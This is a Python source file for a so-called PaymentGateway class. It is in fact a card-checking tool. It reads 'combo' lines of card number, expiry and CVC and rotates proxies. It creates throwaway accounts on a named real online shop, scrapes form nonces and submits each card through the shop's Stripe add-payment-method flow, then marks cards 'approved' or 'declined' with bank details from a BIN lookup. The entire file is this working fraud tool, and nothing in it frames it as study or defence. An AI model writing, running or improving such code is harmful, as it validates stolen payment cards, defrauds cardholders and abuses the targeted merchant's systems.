import aiohttp
import re
import random
import string
from datetime import datetime
import os
import logging

logger = logging.getLogger(__name__)

class PaymentGateway:
    def __init__(self):
        self.stripe_key = os.getenv('STRIPE_KEY')
        self.bin_cache = {}

    async def fetch_nonce(self, session, url, pattern, proxy=None):
        try:
            async with session.get(url, proxy=proxy) as response:
                html = await response.text()
                match = re.search(pattern, html)
                return match.group(1) if match else None
        except Exception as e:
            logger.error(f"Nonce error: {str(e)}")
            return None

    def generate_random_account(self):
        name = ''.join(random.choices(string.ascii_lowercase, k=10))
        numbers = ''.join(random.choices(string.digits, k=4))
        return f"{name}{numbers}@yahoo.com"

    async def fetch_bin_info(self, bin_number):
        try:
            if bin_number in self.bin_cache:
                return self.bin_cache[bin_number]
            
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://lookup.binlist.net/{bin_number}') as response:
                    if response.status == 200:
                        data = await response.json()
                        bin_info = {
                            'scheme': data.get('scheme', 'N/A'),
                            'type': data.get('type', 'N/A'),
                            'brand': data.get('brand', 'N/A'),
                            'prepaid': data.get('prepaid', 'N/A'),
                            'country': data.get('country', {}).get('name', 'N/A'),
                            'bank': data.get('bank', {}).get('name', 'N/A')
                        }
                        self.bin_cache[bin_number] = bin_info
                        return bin_info
        except Exception as e:
            logger.error(f"BIN error: {str(e)}")
        return None

    async def process_payment(self, combo, proxy_pool):
        start_time = datetime.now()
        proxy = random.choice(proxy_pool) if proxy_pool else None
        
        try:
            card_data = combo.split("|")
            if len(card_data) != 4:
                raise ValueError("Invalid combo format")
                
            bin_number = combo[:6]
            bin_info = await self.fetch_bin_info(bin_number)
            
            async with aiohttp.ClientSession() as session:
                # Nonce fetching
                nonce = await self.fetch_nonce(
                    session, 
                    'https://www.dragonworksperformance.com/my-account',
                    r'name="woocommerce-register-nonce" value="(.*?)"',
                    proxy=proxy
                )
                if not nonce:
                    return {'status': 'error', 'message': 'Nonce failed'}

                # Account registration
                email = self.generate_random_account()
                reg_data = {
                    "email": email,
                    "woocommerce-register-nonce": nonce,
                    "_wp_http_referer": "/my-account/",
                    "register": "Register"
                }
                async with session.post(
                    'https://www.dragonworksperformance.com/my-account',
                    data=reg_data,
                    proxy=proxy
                ) as response:
                    if response.status != 200:
                        return {'status': 'error', 'message': 'Registration failed'}

                # Payment nonce
                payment_nonce = await self.fetch_nonce(
                    session,
                    'https://www.dragonworksperformance.com/my-account/add-payment-method/',
                    r'"createAndConfirmSetupIntentNonce":"(.*?)"',
                    proxy=proxy
                )
                if not payment_nonce:
                    return {'status': 'error', 'message': 'Payment nonce failed'}

                # Stripe processing
                stripe_data = {
                    "type": "card",
                    "card[number]": card_data[0],
                    "card[cvc]": card_data[3],
                    "card[exp_year]": card_data[2][-2:],
                    "card[exp_month]": card_data[1],
                    "billing_details[address][postal_code]": "10009",
                    "billing_details[address][country]": "US",
                    "key": self.stripe_key
                }
                async with session.post(
                    'https://api.stripe.com/v1/payment_methods',
                    data=stripe_data,
                    proxy=proxy
                ) as stripe_res:
                    stripe_json = await stripe_res.json()
                    if 'id' not in stripe_json:
                        return {'status': 'declined'}
                    payment_id = stripe_json['id']

                # Payment confirmation
                confirm_data = {
                    "action": "create_and_confirm_setup_intent",
                    "wc-stripe-payment-method": payment_id,
                    "_ajax_nonce": payment_nonce,
                }
                async with session.post(
                    'https://www.dragonworksperformance.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
                    data=confirm_data,
                    proxy=proxy
                ) as confirm_res:
                    confirm_json = await confirm_res.json()
                    if confirm_json.get("success", False) and confirm_json.get("data", {}).get("status", "") == "succeeded":
                        return {
                            'status': 'approved',
                            'combo': combo,
                            'bin_info': bin_info,
                            'check_time': (datetime.now() - start_time).total_seconds()
                        }
                    return {'status': 'declined'}
                    
        except Exception as e:
            logger.error(f"Payment error: {str(e)}")
            return {'status': 'error', 'message': str(e)}